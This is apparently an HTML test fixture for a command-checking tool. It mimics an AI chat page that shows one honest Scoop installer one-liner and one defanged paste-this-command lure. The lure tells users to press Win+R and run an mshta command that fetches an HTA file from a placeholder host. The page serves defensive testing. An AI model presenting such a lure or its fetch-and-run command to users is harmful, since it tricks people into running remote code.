@@ -1,0 +1,53 @@
+<!doctype html>
+<!-- Stand-in for an AI chat showing two answers, for the command check: a paste-a-command lure (a code block with a
+     Copy button and a "verify you're human: Win+R" message) and an honest installer. The lure is a defanged test
+     sample, its address is under example.invalid, and the command does nothing. Like real sites do, the Copy button
+     writes the clipboard with navigator.clipboard.writeText, which fires no copy event. -->
+<html lang="en">
+<head><meta charset="utf-8"><title>AI chat (Clotr test page)</title></head>
+<body>
+  <main>
+    <article class="msg" id="lure" data-message-author-role="assistant">
+      <p>Shared by Support Team. Verification step: open the Run box (Win+R), paste and press Enter, then come back to this chat.</p>
+      <div class="code-block">
+        <div class="code-head"><span class="lang">cmd</span><button type="button" class="copy" data-for="lure-code" aria-label="Copy code">Copy</button></div>
+        <pre><code id="lure-code">mshta https://captcha.example.invalid/verify.hta</code></pre>
+      </div>
+    </article>
+
+    <article class="msg" id="honest" data-message-author-role="assistant">
+      <p>To install Scoop, open PowerShell (not as administrator) and run this one-liner from scoop.sh.</p>
+      <div class="code-block">
+        <div class="code-head"><span class="lang">powershell</span><button type="button" class="copy" data-for="honest-code" aria-label="Copy code">Copy</button></div>
+        <pre><code id="honest-code">irm get.scoop.sh | iex</code></pre>
+      </div>
+    </article>
+  </main>
+
+  <form id="composer">
+    <textarea id="msg" placeholder="Message the AI" rows="2" cols="60"></textarea>
+    <button type="submit" id="send" aria-label="Send prompt">Send</button>
+  </form>
+
+  <script>
+    window.__sent = [];
+    // The page's own Copy button writes the clipboard directly (no copy event), the way AI chats offer code.
+    for (const btn of document.querySelectorAll("button.copy")) {
+      btn.addEventListener("click", () => {
+        const code = document.getElementById(btn.dataset.for);
+        navigator.clipboard.writeText(code.textContent).catch(() => {});
+      });
+    }
+    const box = document.getElementById("msg");
+    function send() {
+      if (!box.value) return;
+      window.__sent.push(box.value);
+      box.value = "";
+    }
+    document.getElementById("composer").addEventListener("submit", (e) => { e.preventDefault(); send(); });
+    box.addEventListener("keydown", (e) => {
+      if (e.key === "Enter" && !e.shiftKey) { e.preventDefault(); send(); }
+    });
+  </script>
+</body>
+</html>
